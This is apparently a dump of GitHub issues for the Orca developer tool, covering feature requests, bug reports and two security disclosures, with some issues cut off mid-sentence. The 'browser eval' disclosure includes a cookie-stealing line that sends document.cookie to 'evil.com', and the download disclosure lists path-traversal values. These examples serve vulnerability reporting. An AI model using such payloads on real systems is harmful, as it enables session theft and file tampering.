## Problem or use case

Amp is already available as a launchable CLI agent in Orca, but it does not have first-class runtime status reporting in the Agents tab/worktree indicators like Claude, Codex, Gemini, OpenCode, Cursor, etc.

Today, adding Amp to Orca's OSC/title-based detection is intentionally unsafe because `amp` is a short substring and would create false positives in ordinary terminal titles such as `timestamp ready` or `clamp working`. Orca already protects against this class of false positives.

Amp has a documented TypeScript plugin system with lifecycle/tool events such as `session.start`, `agent.start`, `tool.call`, `tool.result`, and `agent.end`, which provides a better integration path than title heuristics.

Related context:
- #2054 tracks a broader issue where several supported/new CLI agents do not appear in the Agents tab.
- This issue is specifically about Amp and proposes using Amp's plugin system instead of widening title detection.

## Proposed solution

Add a managed Orca Amp plugin that reports Amp lifecycle events into Orca's existing agent-hook status pipeline.

Suggested behavior:

- Install a managed Amp system plugin, for example under Amp's user plugin directory, with an Orca-managed marker so user-authored plugin files are not overwritten.
- The plugin should no-op unless it is running inside an Orca terminal pane with `ORCA_PANE_KEY` and agent-hook endpoint/token environment available.
- The plugin should POST to Orca's existing hook server at a new `/hook/amp` route.
- Map Amp events into Orca's normalized agent states:
  - `agent.start` -> `working`
  - `tool.call` -> `working` with `toolName` / `toolInput`
  - `tool.result` -> keep/report `working` with useful result/error context when available
  - `agent.end` -> `done`
- Add `amp` to the hook source/types/status surfaces so Amp appears alongside the other first-class hook-backed agents.
- Support SSH workspaces by installing the same managed Amp plugin on the remote host, mirroring the existing remote managed hook installer pattern.
- Keep Amp out of OSC/title substring detection to preserve the current false-positive guard.

Acceptance criteria:

- Launching Amp inside an Orca terminal shows an Amp row in the Agents tab.
- Amp status changes to working when a prompt/tool run starts and done when the turn ends.
- Tool calls show useful tool context when the Amp plugin event provides it.
- Running Amp outside Orca does not produce errors or visible side effects.
- SSH-hosted Amp sessions report status through Orca's remote hook/relay path.
- Existing false-positive tests for words containing `amp` continue to pass.

## Alternatives or additional context

Alternatives considered:

1. Add Amp to title/process-name detection.
   This is risky because `amp` is a short substring and would misclassify unrelated terminal titles. Orca already documents this risk in the existing title-detection code.

2. Treat this as part of the broader custom-agent detection work in #2054.
   That would help visibility for many tools, but Amp has a plugin API that can provide richer and more reliable status than generic detection.

3. Use a per-terminal config overlay.
   This avoids touching Amp's global plugin directory, but it may require changing config-root environment variables for the whole terminal session. A managed plugin that no-ops outside Orca is less invasive for normal shell behavior.

Amp plugin docs:
- https://ampcode.com/manual#plugins
- https://ampcode.com/manual/plugin-api
payload.title: [Feature]: Add first-class Amp agent status integration via Amp plugins

# [Bug]: AI Provider Accounts panel crashes renderer with Minified React error #185 (Maximum update depth exceeded)

### Operating system

Windows

### Orca version

1.4.26 (also reproduced on 1.4.21 prior to today's auto-update)

### Summary

Clicking **Settings â†’ AI Provider Accounts** triggers an infinite render loop in the panel's mount-phase passive effects. React aborts with [Minified React error #185](https://react.dev/errors/185) ("Maximum update depth exceeded"), the component tree unmounts, and the entire UI goes black. The renderer *process* survives (Windows reports it as "Responding"), so it's not a process crash â€” it's React tearing down the tree because a passive effect keeps re-triggering itself.

This also appears to break two related UI surfaces that likely share the same store subscription:
- **AI Agent Settings** panel shows "no agents installed" even though Claude, Gemini, and cursor-agent are all installed and detectable via Orca's documented login-shell probe (see "Detection works" section below).
- **New terminal tab dropdown** no longer lists `claude` as an agent option.

### Reproduction (100% consistent)

1. Open Orca with at least one configured AI provider (or none â€” same result).
2. Open DevTools (Ctrl+Shift+I) â†’ Console tab â†’ clear console.
3. Click **Settings â†’ AI Provider Accounts**.
4. Within a few hundred ms, React error #185 fires and the UI blacks out.

### Console output (cleared before click)

The only line before clicking the panel is an unrelated SSH reconnect message:
```
index-BE-3p1wX.js:166102 SSH auto-reconnect failed for ssh-1779286781062-l3bkym: Error: SSH reconnect timeout
```

Then immediately after clicking AI Provider Accounts:

```
index-BE-3p1wX.js:2641 Uncaught Error: Minified React error #185; visit https://react.dev/errors/185 for the full message or use the non-minified dev environment for full errors and additional helpful warnings.
    at getRootForUpdatedFiber (index-BE-3p1wX.js:2641:66)
    at enqueueConcurrentRenderForLane (index-BE-3p1wX.js:2629:12)
    at forceStoreRerender (index-BE-3p1wX.js:4318:17)
    at updateStoreInstance (index-BE-3p1wX.js:4300:37)
    at commitHookEffectListMount (index-BE-3p1wX.js:6975:26)
    at commitPassiveMountOnFiber (index-BE-3p1wX.js:8125:25)
    at recursivelyTraversePassiveMountEffects (index-BE-3p1wX.js:8106:9)
    at commitPassiveMountOnFiber (index-BE-3p1wX.js:8222:9)
    ... (recursivelyTraversePassiveMountEffects / commitPassiveMountOnFiber repeats deeply)
    at flushPassiveEffects (index-BE-3p1wX.js:9347)
    at flushPendingEffects (index-BE-3p1wX.js:9327)
    at flushSpawnedWork (index-BE-3p1wX.js:9313)
    at commitRoot (index-BE-3p1wX.js:9183)
    at performSyncWorkOnRoot (index-BE-3p1wX.js:9572)
```

### Diagnosis

The trace is conclusive: `forceStoreRerender â†’ updateStoreInstance â†’ commitHookEffectListMount` is React's `useSyncExternalStore` reconciliation path. A subscription registered in a mount-phase passive effect is firing a store re-render, which causes the same effect to re-mount and re-subscribe, which fires another re-render â€” an infinite tight loop that React aborts at the safety limit.

The likely shape of the bug is one of:

- A `useSyncExternalStore` whose `getSnapshot` returns a **new object/array reference on every call** (e.g. `[...accounts]`, `{ ...state }`, or `accounts.filter(...)` inline) â€” React sees a new snapshot every read, fires re-render, the effect re-subscribes, repeat.
- A subscription whose subscribe callback writes back to the same slice it reads from.
- A selector that derives state and stores it back into the store synchronously.

Search the renderer bundle for the component(s) backing the AI Provider Accounts pane and the AI Agent Settings pane. The crash happens during the *initial* mount, so any `useEffect` / `useLayoutEffect` / `useSyncExternalStore` on those panels is in scope.

# Security Issue: Unrestricted JavaScript Evaluation via Browser Eval Command

## Description
The `browser eval` command accepts and executes arbitrary JavaScript expressions from user input without any sanitization or sandboxing restrictions, enabling code injection and XSS-like attacks.

## Context
- File: `src/cli/handlers/browser-nav.ts:76-81`
- Command: `orca browser eval --expression <js-code>`
- Component: Browser navigation CLI handlers

## Current Behavior
The `eval` handler directly passes user input to the browser's `evaluate()` function:
```typescript
eval: async ({ flags, client, cwd, json }) => {
  const expression = getRequiredStringFlag(flags, 'expression')  // ❌ No validation
  const target = await getBrowserCommandTarget(flags, cwd, client)
  const result = await client.call<BrowserEvalResult>('browser.eval', { expression, ...target })
  printResult(result, json, (v) => v.result)
}
```

The runtime then executes it directly in the browser page context:
```typescript
async browserEval(params: { expression: string } & BrowserCommandTargetParams): Promise<BrowserEvalResult> {
  const target = await this.resolveBrowserCommandTarget(params)
  return this.requireAgentBrowserBridge().evaluate(params.expression, target.worktreeId, target.browserPageId)
}
```

## Expected Behavior
JavaScript evaluation should be restricted to a safe subset, require explicit user confirmation, or be sandboxed to prevent access to sensitive browser APIs.

## Steps to Reproduce
1. Navigate to any website (e.g., `orca browser goto https://example.com`)
2. Run: `orca browser eval --expression "document.cookie"`
3. Observe all cookies printed to console (data exfiltration)
4. Run: `orca browser eval --expression "window.location.href='http://evil.com/steal?c='+encodeURIComponent(document.cookie)"`
5. Browser navigates to attacker's URL with stolen cookies
6. Run: `orca browser eval --expression "document.querySelectorAll('input[type=password]').forEach(i=>i.value='')"`
7. All password fields are cleared (disruption)

## Suggested Fix

### Option 1: Add confirmation prompt
```diff
diff --git a/src/cli/handlers/browser-nav.ts b/src/cli/handlers/browser-nav.ts
index XXXX..YYYY 100644
--- a/src/cli/handlers/browser-nav.ts
+++ b/src/cli/handlers/browser-nav.ts
@@ -76,8 +76,17 @@ export const BROWSER_NAV_HANDLERS: Record<string, CommandHandler> = {
   eval: async ({ flags, client, cwd, json }) => {
     const expression = getRequiredStringFlag(flags, 'expression')
+    // Require confirmation for eval commands to prevent accidental code execution
+    console.warn(`⚠️  About to execute JavaScript in browser context:\n${expression}`)
+    const { confirm } = await import('@inquirer/prompts')
+    const confirmed = await confirm({ message: 'Execute this JavaScript?', default: false })
+    if (!confirmed) {
+      console.log('Eval cancelled.')
+      return
+    }
     const target = await getBrowserCommandTarget(flags, cwd, client)
     const result = await client.call<BrowserEvalResult>('browser.eval', { expression, ...target })
     printResult(result, json, (v) => v.result)
```

### Option 2: Implement expression whitelist
```typescript
const ALLOWED_EVAL_PATTERNS = [
  /^window\.location\.(href|pathname|search|hash)$/,
  /^document\.title$/,
  /^document\.readyState$/,
  // Add more safe patterns as needed
]

function validateEvalExpression(expression: string): void {
  const trimmed = expression.trim()
  if (!ALLOWED_EVAL_PATTERNS.some(pattern => pattern.test(trimmed))) {
    throw new RuntimeClientError(
      'invalid_argument',
      `Expression '${trimmed}' is not allowed. Eval is restricted to safe property access.`
    )
  }
}
```

### Option 3: Deprecate and provide safer alternatives
- Add `--eval-unsafe` flag with confirmation (for power users)
- Add safe helper commands: `browser get --property title`, `browser get --property url`, etc.
- Document the security implications of eval in the CLI help text

## Impact
- **Who is affected

## Description
The `browser download` command accepts arbitrary paths from user input without validation, allowing path traversal attacks that can write files anywhere on the filesystem.

## Context
- File: `src/cli/handlers/browser-interact.ts:312-318`
- Command: `orca browser download --selector <element> --path <path>`
- Component: Browser interaction CLI handlers

## Current Behavior
The `download` handler directly passes the user-provided `--path` flag to the runtime without any validation:
```typescript
download: async ({ flags, client, cwd, json }) => {
  const selector = getRequiredStringFlag(flags, 'selector')
  const path = getRequiredStringFlag(flags, 'path')  // ❌ No validation
  const target = await getBrowserCommandTarget(flags, cwd, client)
  const result = await client.call<unknown>('browser.download', { selector, path, ...target })
  printResult(result, json, () => `Downloaded to ${path}`)
}
```

This allows attackers to use:
- Absolute paths: `--path /etc/passwd`
- Path traversal: `--path ../../../malware.sh`
- Windows paths: `--path C:\\Windows\\System32\\evil.exe`

## Expected Behavior
Paths should be validated to ensure files are written only within a designated download directory (e.g., `~/Downloads/orca/`), with proper sandboxing and permission checks.

## Steps to Reproduce
1. Run: `orca browser download --selector "a" --path "/tmp/malicious.txt"`
2. File is written to `/tmp/malicious.txt` (or any arbitrary location)
3. Repeat with `--path "../../../system.sh"` to traverse directories

## Suggested Fix
```diff
diff --git a/src/cli/handlers/browser-interact.ts b/src/cli/handlers/browser-interact.ts
index XXXX..YYYY 100644
--- a/src/cli/handlers/browser-interact.ts
+++ b/src/cli/handlers/browser-interact.ts
@@ -309,7 +309,20 @@ export const BROWSER_INTERACT_HANDLERS: Record<string, CommandHandler> = {
   download: async ({ flags, client, cwd, json }) => {
     const selector = getRequiredStringFlag(flags, 'selector')
     const path = getRequiredStringFlag(flags, 'path')
+    // Validate path to prevent path traversal attacks
+    if (path.includes('..') || path.startsWith('/') || /^[A-Za-z]:/.test(path)) {
+      throw new RuntimeClientError(
+        'invalid_argument',
+        '--path must be a relative path within the download directory (no absolute paths or ".." sequences)'
+      )
+    }
+    // Restrict to safe filename characters
+    if (!/^[a-zA-Z0-9._-]+$/.test(path)) {
+      throw new RuntimeClientError(
+        'invalid_argument',
+        '--path must contain only alphanumeric characters, dots, underscores, and hyphens'
+      )
+    }
     const target = await getBrowserCommandTarget(flags, cwd, client)
     const result = await client.call<unknown>('browser.download', { selector, path, ...target })
     printResult(result, json, () => `Downloaded to ${path}`)
```

Alternative approach: Create a sandboxed download directory and prepend it to all user-provided paths:
```typescript
import { join } from 'path'
import { homedir } from 'os'

const DOWNLOAD_DIR = join(homedir(), 'Downloads', 'orca')

// In download handler:
const safePath = join(DOWNLOAD_DIR, path)
// Verify the resolved path is still within DOWNLOAD_DIR
const resolvedPath = resolve(safePath)
if (!resolvedPath.startsWith(DOWNLOAD_DIR)) {
  throw new RuntimeClientError('invalid_argument', 'Invalid download path')
}
```

## Impact
- **Who is affected**: All users of the browser download command via CLI
- **Severity**: HIGH
- **Attack scenarios**:
  - Overwrite system files causing crashes or instability
  - Place malicious executables in auto-start directories
  - Exfiltrate data by writing files to accessible locations
  - Tamper with project dependencies

## Environment
- Version: main branch (2026-05-24)
- OS: All platforms (macOS, Linux, Windows)

_Positively — happy to submit a PR if this is welcome._

payload.body:
### Operating system

macOS

### Orca version

1.4.22 (latest)

### Details

**Environment:**

- macOS Sequoia, Mac mini M1
- Orca (latest as of May 2026)
- Tailscale installed with MagicDNS enabled (CorpDNS: true)

**Symptoms:**

- Claude API: "Unable to connect API" with WebSocket error and Connection Refused
- Codex API: "Falling back from WebSockets to HTTPS transport. stream disconnected before completion: failed to lookup address information: nodename nor servname provided, or not known"
- Both APIs work fine from the same machine via curl and in other terminals (Ghostty)
- Both APIs work fine in Orca on a different machine on the same Tailscale network

**Root cause:**
Machine in question had no DNS servers configured on its Ethernet interface. Tailscale's MagicDNS (100.100.100.100) was the only resolver. Standard HTTP requests resolved fine, but Orca's WebSocket implementation failed to resolve hostnames.

The other machine had public DNS servers configured alongside Tailscale, which is why it worked there.

**Resolution:**
Adding fallback DNS servers to the Ethernet interface resolved it immediately:
`networksetup -setdnsservers Ethernet 1.1.1.1 8.8.8.8`


**Core Issue:**
Orca's WebSocket/DNS resolution path appears to handle non-standard DNS resolvers differently than its HTTP path. When the only available DNS is a local/virtual resolver like Tailscale's 100.100.100.100, WebSocket connections fail while HTTP succeeds. This suggests the WebSocket implementation may bypass the system resolver or have stricter requirements for DNS server responses.

payload.body:
## Summary

When a worktree is removed for a repo connected over SSH, the `scripts.archive` hook defined in `orca.yaml` is never executed. The local-repo path runs the archive hook before removing the worktree, but the SSH path returns early before the hook block is reached.

This causes any teardown logic users encode in `archive` (stopping local dev stacks, killing background processes, releasing ports, deprovisioning ephemeral resources, etc.) to be silently skipped, leaving orphaned state on the remote host after the directory is deleted.

## Where

`src/main/ipc/worktrees.ts`, in the worktree-removal IPC handler:

```ts
if (repo.connectionId) {
  await provider!.removeWorktree(canonicalWorktreePath, args.force)
  runtime.clearOptimisticReconcileToken(args.worktreeId)
  store.removeWorktreeMeta(args.worktreeId)
  deleteWorktreeHistoryDir(args.worktreeId)
  notifyWorktreesChanged(mainWindow, repoId)
  return                                      // ← early return
}

// Run archive hook before removal
const hooks = getEffectiveHooks(repo)
if (hooks?.scripts.archive && !args.skipArchive) {
  const result = await runHook('archive', canonicalWorktreePath, repo)
  …
}
```

The early `return` on the SSH branch makes the archive block below unreachable for any remote repo.

On the relay side, `src/relay/git-handler-worktree-ops.ts` `removeWorktreeOp` runs:

```
git worktree remove [--force] <path>
git worktree prune
```

`git worktree remove` deletes the directory, so even if a caller later tried to run the archive hook against the worktree path, the working directory would already be gone.

## Steps to reproduce

1. Connect Orca to a repo over SSH.
2. Add an `orca.yaml` at the repo root with a `scripts.archive` block that writes a sentinel file (e.g. `touch /tmp/orca-archive-ran`) or appends to a known log.
3. Create a worktree from Orca.
4. Delete the worktree from Orca.
5. Observe on the remote host: the sentinel file never appears, and any background processes the archive script was supposed to stop are still running.

The same `orca.yaml` on a local repo correctly runs the archive script on removal.

## Expected

The archive hook should run on worktree removal regardless of whether the repo is local or SSH-connected. The local branch's ordering (run archive hook → then remove worktree) is the correct contract; the SSH branch should follow it too.

## Suggested fix

Move the archive hook block above the SSH early-return so both code paths invoke it before deletion:

```ts
// Run archive hook before removal (both local and SSH)
const hooks = getEffectiveHooks(repo)
if (hooks?.scripts.archive && !args.skipArchive) {
  const result = await runHook('archive', canonicalWorktreePath, repo)
  if (!result.success) {
    console.error(`[hooks] archive hook failed for ${canonicalWorktreePath}:`, result.output)
  }
}

if (repo.connectionId) {
  await provider!.removeWorktree(canonicalWorktreePath, args.force)
  runtime.clearOptimisticReconcileToken(args.worktreeId)
  store.removeWorktreeMeta(args.worktreeId)
  deleteWorktreeHistoryDir(args.worktreeId)
  notifyWorktreesChanged(mainWindow, repoId)
  return
}
```

This mirrors how setup hooks are handled symmetrically between SSH and local creation paths.

## Impact

Any team relying on `scripts.archive` to clean up per-worktree side-effects (running services, allocated ports, ephemeral databases, container projects, etc.) will accumulate orphaned resources every time a worktree is removed over SSH. The failure is silent — there is no log line or UI surface indicating that the hook was skipped.
payload.title: SSH-remote worktree removal skips orca.yaml archive hook

payload.body:
### Problem or use case

Both "+" buttons in the sidebar (next to "WORKSPACES" and next to each project) open the same composer, and every path through that composer creates a new git worktree via `git worktree add`. Two reasonable workflows have no path forward today:

**Folder projects feel half-supported.** When a folder-kind project is added, Orca auto-creates one synthetic workspace for it. After that, clicking "+" on the project does nothing useful — the composer filters folder repos out of its eligible list, and the create IPC rejects them outright with *"Folder mode does not support creating worktrees."* Users who want two workspaces on the same folder have no way to get there.

**Existing branches can only be used as a *base*, not opened directly.** Every submit in the composer calls `createWorktree(...)`, which materializes a new worktree directory. The Name field's branch picker looks like it should "open" a branch but actually just preselects the *base* for a new worktree. There's no way to open the repo's main checkout as a workspace, and no way to adopt an existing on-disk worktree that Orca doesn't yet track.

The root cause is that the data model treats every workspace as a 1:1 wrapper around a `Worktree` keyed by `${repoId}::${path}` — so workspaces sharing one path, or workspaces without a dedicated worktree, are both structurally impossible.


### Proposed solution

Decouple the *workspace* concept (a named session with agent, terminals, note, linked issue) from the *worktree* concept (a directory on disk, optionally a git worktree). Stage the work so each step ships on its own.


**Stage 1 — Multiple workspaces per folder repo.** 

Allow a folder path to back multiple workspace records. Generate uuid-suffixed IDs for folder-kind workspaces; git-kind IDs stay path-based and unchanged. Lift the folder-repo guard in the create IPC for this path. Re-enable the "+" button for folder-only repo lists.

*Result:* clicking "+" on a folder project creates an additional workspace on the same directory, with its own name, agent, and terminal state.

**Stage 2 — "Open existing" mode in the composer.** 

Add a segmented control at the top of the composer: **New worktree** (current behavior) vs **Open existing**. In *Open existing* mode for git repos, the user picks either the repo's main checkout (common case, no `git worktree add` involved) or an already-existing on-disk worktree to adopt (created outside Orca, recovered from another machine, etc.). Submit creates a workspace record pointing at the existing path; no new directory is created.

*Result:* users can work on `main` as a workspace without Orca creating a parallel directory, and can bring pre-existing worktrees under Orca's management.

**Stage 3 (optional follow-up) — Split the types.**

Introduce a `Workspace` type distinct from `Worktree` so the type system matches the user-facing model. Only worth doing if stages 1+2 leave real friction; tracked here as a follow-up, not part of the initial work.


Non-goals: renaming "Workspace" / "Worktree" in the UI; changing how new git worktrees are materialized (paths, base-ref logic, sparse checkout, setup hooks); multi-workspace support for git repos sharing a single worktree path (git repos already get multi-workspace behavior via separate worktrees).


### Alternatives or additional context

**Alternative considered: split the "+" into a dropdown menu** 
("New worktree…" / "Open existing…" / "New folder workspace…") instead of a mode toggle inside the composer. Rejected because it hides the "open existing" path behind an extra click and adds sidebar UI churn for a behavior that fits naturally as a mode switch at the top of the existing form.

**Alternative considered: do stage 3 (full type split) up front.** 
Rejected because `Worktree.id` is referenced throughout state, IPC, persistence, and telemetry — a single PR would be high-risk and block the user-visible wins behind a long refactor. Stages 1 and 2 deliver t
payload.title: [Feature]: Support creating workspaces decoupled from new worktrees

payload.author: phildenhoff
payload.body:
### Problem or use case

[SSH configs can use the `Include` directive to include the contents of another file](https://man7.org/linux/man-pages/man5/ssh_config.5.html#:~:text=appear%20before%20it.-,Include,-Include%20the%20specified).

In particular, this is used by tools like [Orbstack](https://orbstack.dev/) to maintain the set of Hosts available from Orbstack, without clobbering changes in the user's ~/.ssh/config. However, Orca does not process these directives and so Orbstack hosts aren't imported automatically.

### Proposed solution

Update the SSH host importer to read `Include` directives at the top level as well as within `Host` and `Match` blocks, which are supported in [Linux](https://man7.org/linux/man-pages/man5/ssh_config.5.html#:~:text=Include%20directive%20may%20appear%20inside%20a%20Match%20or%20Host%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20block%20to%20perform%20conditional%20inclusion) and [OpenBSD](https://man.openbsd.org/ssh_config.5#:~:text=Include%20directive%20may%20appear%20inside%20a%20Match%20or%20Host%20block%20to%20perform%20conditional%20inclusion) `ssh_config`s.

Build the SSH config in memory as though each `Include <path>` line were replaced by the contents of the matched files, preserving Include order.

The importer should be best effort: invalid paths, unreadable files, empty globs, and unset environment variables should not fail the whole import. Cache file contents where useful, but evaluate repeated `Include` at each `Include` location. Prevent cyclic references by tracking the active inclusion stack.

### Alternatives or additional context

[Windows OpenSSH uses the same OpenSSH client configuration semantics](https://learn.microsoft.com/en-us/windows-server/administration/OpenSSH/openssh-server-configuration), with user config rooted at `%userprofile%\.ssh\config`.

Valid examples:

- `Include=<path>`
- `Include conf.d/*.conf` imports matched files in lexical order
- `Include <path1> <path2>` imports multiple files
- `Include "<path with whitespace>"`
- ~, relative ~/.ssh paths, `%userprofile%\.ssh` on Windows, and ${ENVVAR} expansion. ([see Linux man](https://man7.org/linux/man-pages/man5/ssh_config.5.html#:~:text=each%20pathname%20may%20contain%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20glob(7)%20wildcards%2C%20tokens%20as%20described%20in%20the%20%E2%80%9CTOKENS%E2%80%9D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20section%2C%20environment%20variables%20as%20described%20in%20the%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%E2%80%9CENVIRONMENT%20VARIABLES%E2%80%9D%20section))

Because import does not have a selected target host/user/port, target-dependent `Include` tokens such as `%h`, `%n`, `%p`, `%r`, `%j`, `%k`, and `%C` will need to be skipped during import
payload.title: [Feature]: SSH config import uses `Include <path>` directives

payload.author: maco222
payload.body:
## Summary

`resources/linux/bin/orca` cannot locate the packaged binary on any `.deb`/AppImage from v1.4.2-rc.0 onwards. Every `orca` invocation fails before reaching `out/cli/index.js`.

## Repro (clean `dpkg -i orca-ide_1.4.16_amd64.deb`)

```
$ /opt/Orca/resources/bin/orca --help
Unable to locate the Orca executable next to /opt/Orca/resources
```

After the in-app "Install CLI" runs (symlink `~/.local/bin/orca → /opt/Orca/resources/bin/orca`):

```
$ orca --help
/home/$USER/.local/bin/orca: line 27: /home/$USER/orca: Is a directory
```

## Root cause

Two issues in the wrapper:

1. **Wrong binary name.** It probes `$APP_DIR/orca` and `$APP_DIR/Orca`, but `config/electron-builder.config.cjs` sets `executableName: 'orca-ide'` for Linux (PR #1306, intentional vs. Ubuntu's GNOME Orca package). Actual binary: `/opt/Orca/orca-ide`.
2. **Symlink not resolved.** `APP_DIR` is computed from `dirname BASH_SOURCE` without `readlink`. When invoked via the `~/.local/bin/orca` symlink that `CliInstaller` creates, `APP_DIR=$HOME`, then `[ -x "$HOME/orca" ]` matches `$HOME/orca/` as a directory (Bash `-x` is true for traversable dirs) and the script tries to exec it. `resources/darwin/bin/orca` already handles this via `app_realpath()`; Linux never got the equivalent. Same class as the Windows fix in PR #282.

## Affected

Broken since `543d9a6c` (PR #1306, 2026-05-14). Ships in every release from v1.4.2-rc.0 through v1.4.16. CI builds the `.deb` but no workflow runs `orca --help` against the build artifact.

## Suggested fix

Resolve symlinks before computing `APP_DIR`, probe `orca-ide` first, and guard against directories matching `-x`:

```bash
SOURCE="${BASH_SOURCE[0]}"
while [ -h "$SOURCE" ]; do
  DIR="$(cd "$(dirname "$SOURCE")" >/dev/null 2>&1 && pwd)"
  SOURCE="$(readlink "$SOURCE")"
  [[ "$SOURCE" != /* ]] && SOURCE="$DIR/$SOURCE"
done
SCRIPT_DIR="$(cd "$(dirname "$SOURCE")" >/dev/null 2>&1 && pwd)"
# ... APP_DIR same as before ...
for c in orca-ide orca Orca; do
  if [ -f "$APP_DIR/$c" ] && [ -x "$APP_DIR/$c" ]; then
    ELECTRON="$APP_DIR/$c"; break
  fi
done
```

Happy to open the PR.
payload.title: [Bug]: Linux CLI wrapper looks for /opt/Orca/orca but executableName is 'orca-ide' (1.4.2+)

payload.author: Jeet-Chugh
payload.body:
## Summary
Since v1.4.13-rc.1 (PR #2461 "Improve workspace port visibility"), the right-sidebar Ports tab was removed from `ACTIVITY_ITEMS` in `src/renderer/src/components/right-sidebar/index.tsx`. The replacement surfaces (status-bar Ports segment, per-worktree Live Ports rollup) only show ports that the workspace scanner can attribute to a worktree. For SSH-remote setups, this leaves no way to:

1. View the raw list of remote listening ports (the `ports.detect` / `detectedPortsByConnection` data).
2. Manually add a port-forward (the `SshPortsPanel` with the `+ Add` button is now orphaned — no code path mounts it).

The underlying machinery is fully intact: `SshPortForwardManager`, the IPC handlers in `src/main/ipc/ssh.ts`, and the `window.api.ssh.{addPortForward,listPortForwards,listDetectedPorts}` preload API all still work. Only the UI surface is gone.

## Reproduction
1. Configure an SSH target and open a worktree on the remote machine.
2. Start a dev server on the remote (e.g. `vite` on port 5173).
3. Open the status-bar Ports popover (Settings → Appearance → Status Bar → "Ports" if hidden).
4. Observe: each worktree reports "0 ports detected", and there is no UI to add a manual `local → remoteHost:remotePort` forward.

## Why "0 ports detected" for remote worktrees
The workspace scanner attributes a listening port to a worktree by matching the listening process's `cwd` against the worktree path. Over SSH this runs via the `workspacePorts.scan` RPC (`src/renderer/src/lib/workspace-port-actions.ts:87`). Attribution silently returns 0 when:
- The remote runtime returns `method_not_found` for `workspacePorts.scan` (older orca-helper).
- The dev server's `cwd` doesn't match the remote worktree path (process supervisors, `cd` before launch).
- `/proc/*/fd` walks lack permission (different user than the SSH login).

The raw `ports.detect` results (which would show every remote listener) aren't surfaced anywhere in the UI.

## Workaround
Drive the IPC manually from DevTools:
\`\`\`js
await window.api.ssh.listDetectedPorts({ targetId })
await window.api.ssh.addPortForward({ targetId, localPort, remoteHost, remotePort, label })
\`\`\`

## Suggested fix
Either re-mount \`SshPortsPanel\` somewhere reachable (status-bar popover when an SSH target is active, a dedicated "Manage forwards" affordance, or restore the activity-bar tab gated on SSH presence), or add a manual-forward dialog to the existing status-bar Ports popover and include a "Detected (remote)" section that lists \`detectedPortsByConnection\`.

## Environment
- Orca v1.4.16 (also confirmed v1.4.14, v1.4.15)
- macOS arm64
- SSH-remote worktrees on a Linux dev VM
payload.title: Manual SSH port-forward UI removed in v1.4.13+ has no replacement; remote workspaces show "0 ports detected"

### Operating system

Windows

### Orca version

v1.4.15

### Details

 ---
  codex-hook.cmd injection causes duplicate keys in Codex config.toml

  ## Bug Report

  ### Summary
  When Orca injects `codex-hook.cmd` into Codex's `hooks.json`, Codex auto-tracks each hook
  in `config.toml` under `[hooks.state]`. On subsequent runs, Codex re-appends the same keys
  using a different quote/escape style, producing duplicate keys that break TOML parsing.

  ### Error
  Error loading config.toml:
  C:\Users\Username\.codex\config.toml:103:14: duplicate key
      |
  103 | [hooks.state."C:\Users\Username\.codex\hooks.json:session_start:0:0"]
      |              ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

### Root Cause
  Orca writes additional hook state entries using double-quote + escaped style:
  - Existing entries (written by Codex): `[hooks.state.'C:\Users\...\hooks.json:session_start:0:0']`
  - Entries added by Orca: `[hooks.state."C:\\Users\\...\\hooks.json:session_start:0:0"]`

  TOML resolves both to the same key → duplicate error → Codex fails to start.


  ### Steps to Reproduce
  1. Install Orca with Codex support
  2. Orca injects hooks into `~/.codex/hooks.json`
  3. Run `codex` — it tracks hooks in `config.toml` (single-quote style)
  4. Open Orca IDE — it appends the same keys using double-quote/escaped style
  5. Run `codex` again: `Error loading config.toml: duplicate key

  ### Workaround
  Manually delete the double-quote/escaped `[hooks.state."C:\\..."]` blocks from `config.toml`.

  ### Environment
  - Orca: latest
  - Codex CLI on Windows 11
  - Shell: PowerShell

  ### Suggestion
  Normalize path strings before checking for existing keys in `config.toml`,
  or deduplicate on write.

  ---
payload.title: [Bug]: codex-hook.cmd injection causes duplicate keys in Codex config.toml

payload.author: Jinwoo-H
payload.body:
### Problem

Mobile Tasks can show work items under an SSH repo record even when that SSH repo does not resolve to a hosted GitHub repository.

The suspected path is:

1. Mobile asks for GitHub work items for a selected SSH repo record.
2. The backend tries to resolve `origin` / `upstream` on the SSH host.
3. If no GitHub owner/repo can be resolved, the query builder omits an explicit repository target.
4. For SSH repos, the GitHub CLI call is intentionally not run with the remote path as `cwd`.
5. The resulting unscoped GitHub CLI command can fall back to the app process's current local GitHub context.
6. Mobile then labels the returned items with the SSH repo record that was queried, creating misleading duplicate rows.

### Expected behavior

If an SSH repo does not resolve to a hosted GitHub repo, GitHub task fetching should not run an unscoped fallback query.

The UI should either:

- skip that repo for GitHub task results with a clear unsupported/unresolved-source reason, or
- require an explicit hosted repository source before querying.

### Notes

Do not infer a hosted source from the app process working directory for SSH-backed repositories. The query should be scoped to the resolved hosted repo identity, or not run.

### Acceptance criteria

- SSH repo records without a resolvable GitHub remote do not return work items from an unrelated local GitHub context.
- Mobile Tasks does not label unrelated hosted work items as belonging to the SSH repo record.
- The failure or skipped state is surfaced in the existing partial-load/error path.
- Add regression coverage for the SSH unresolved-source case.

Made with [Orca](https://github.com/stablyai/orca) 🐋
payload.title: Prevent unscoped GitHub task queries for SSH repos without hosted remotes

### What would you like to see?

Please allow configuring `SSH Relay Grace Period (seconds)` to values higher than `86400` (1 day).

### Why is this useful?

When working over SSH, some long-running tasks are still in progress, but if I step away, go outside, or sleep and come back later, I can no longer reconnect to the same session because the grace period has expired.

A longer relay grace period would make Orca much more practical for overnight work, long builds, long agent runs, and other unattended remote tasks.

### What problem does this solve?

The current limit of about 1 day is too short for some real-world SSH workflows.
It can interrupt access to remote work that is still running normally, even though I only need a longer reconnect window.

- Allow `SSH Relay Grace Period (seconds)` to be set above `86400`
- Ideally support multiple days

### Additional context

This would be especially helpful for:
- overnight coding or agent tasks
- long-running builds, training, or batch jobs
- users who temporarily leave their machine and want to reconnect later

payload.author: Jeet-Chugh
payload.body:
**Recurring pattern (context)**
I've been observing this off and on across the past week of heavy Orca use. Periodically the app just quits the process and I have to reopen it. On reopen, it recovers my sessions cleanly — but it keeps quietly closing itself, and it doesn't *feel* like a crash (no error dialog, no `.ips`, foreground app just vanishes). The single incident below is the one I captured a full timeline for so I have something concrete to attach; the same fingerprint (clean main-process exit, no crash dump) appears to fit the other occurrences too.

---

**Short summary**
